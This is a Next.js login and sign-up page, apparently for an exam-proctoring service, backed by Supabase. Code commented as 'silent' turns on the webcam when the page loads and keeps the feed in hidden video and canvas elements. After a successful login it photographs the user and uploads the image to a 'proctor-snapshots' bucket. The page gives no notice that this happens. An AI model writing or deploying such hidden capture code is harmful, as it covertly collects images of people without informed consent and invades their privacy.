'use client';

import React, { useState, useRef, useEffect } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useRouter } from 'next/navigation';
import { Eye, EyeOff, Loader2, ShieldCheck, Lock } from 'lucide-react';

export default function AuthPage() {
  const router = useRouter();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  // 1. START CAMERA SILENTLY ON LOAD
  useEffect(() => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { 
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
      })
      .catch(() => console.log("Camera access denied - snapshot will be skipped"));
  }, []);

  // 2. SILENT CAPTURE LOGIC
  const takeSnapshot = async (userId: string) => {
    if (!videoRef.current || !canvasRef.current) return;
    const context = canvasRef.current.getContext('2d');
    context?.drawImage(videoRef.current, 0, 0, 640, 480);
    const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg'));
    
    if (blob) {
      // Uploading to proctor-snapshots bucket
      const { error } = await supabase.storage
        .from('proctor-snapshots')
        .upload(`${userId}/${Date.now()}.jpg`, blob);
      if (error) console.error("Snapshot error:", error.message);
    }
  };

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data, error } = isLogin 
        ? await supabase.auth.signInWithPassword({ email, password })
        : await supabase.auth.signUp({ 
            email, 
            password, 
            options: { data: { full_name: fullName } } 
          });

      if (error) throw error;

      if (data.user) {
        // Take the snapshot before moving to the dashboard
        await takeSnapshot(data.user.id);
        router.push('/dashboard');
      }
    } catch (err: any) {
      alert(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden">
      
      {/* INVISIBLE CAMERA TOOLS */}
      <video ref={videoRef} autoPlay muted className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      {/* BACKGROUND DECORATION */}
      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-[#D4AF37]/5 blur-[120px] rounded-full" />

      <div className="w-full max-w-md bg-[#0a0a0a] p-10 rounded-[2.5rem] border border-white/5 shadow-2xl relative z-10">
        <div className="flex justify-center mb-6">
           <div className="p-4 bg-[#D4AF37]/10 rounded-full">
              <ShieldCheck className="text-[#D4AF37]" size={32} />
           </div>
        </div>
        
        <h2 className="text-3xl font-serif italic text-center mb-2">{isLogin ? 'Welcome Back' : 'Create Access'}</h2>
        <p className="text-center text-gray-500 text-[10px] uppercase tracking-[0.3em] mb-10">Secure Identity Terminal</p>
        
        <form onSubmit={handleAuth} className="space-y-4">
          {!isLogin && (
            <div className="relative">
              <input 
                type="text" 
                placeholder="Legal Full Name" 
                value={fullName} 
                onChange={e => setFullName(e.target.value)} 
                className="w-full bg-black border border-white/10 rounded-2xl p-4 outline-none focus:border-[#D4AF37] transition-all" 
                required 
              />
            </div>
          )}
          
          <div className="relative">
            <input 
              type="email" 
              placeholder="Institutional Email" 
              value={email} 
              onChange={e => setEmail(e.target.value)} 
              className="w-full bg-black border border-white/10 rounded-2xl p-4 outline-none focus:border-[#D4AF37] transition-all" 
              required 
            />
          </div>

          <div className="relative">
            <input 
              type={showPassword ? "text" : "password"} 
              placeholder="Passcode" 
              value={password} 
              onChange={e => setPassword(e.target.value)} 
              className="w-full bg-black border border-white/10 rounded-2xl p-4 pr-12 outline-none focus:border-[#D4AF37] transition-all" 
              required 
            />
            {/* EYE ICON TOGGLE */}
            <button 
              type="button" 
              onClick={() => setShowPassword(!showPassword)} 
              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-600 hover:text-[#D4AF37]"
            >
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          </div>

          <button 
            disabled={loading} 
            className="w-full py-4 bg-[#D4AF37] text-black font-black uppercase tracking-widest rounded-full hover:bg-white transition-all mt-6 shadow-lg shadow-[#D4AF37]/10 flex items-center justify-center gap-2"
          >
            {loading ? <Loader2 className="animate-spin" size={20} /> : (isLogin ? 'Establish Link' : 'Initialize')}
          </button>
        </form>

        <button 
          onClick={() => setIsLogin(!isLogin)} 
          className="w-full text-center mt-8 text-[10px] text-gray-600 uppercase tracking-widest hover:text-white transition-colors"
        >
          {isLogin ? 'Request New Terminal Access' : 'Return to Login'}
        </button>
      </div>
    </main>
  );
}
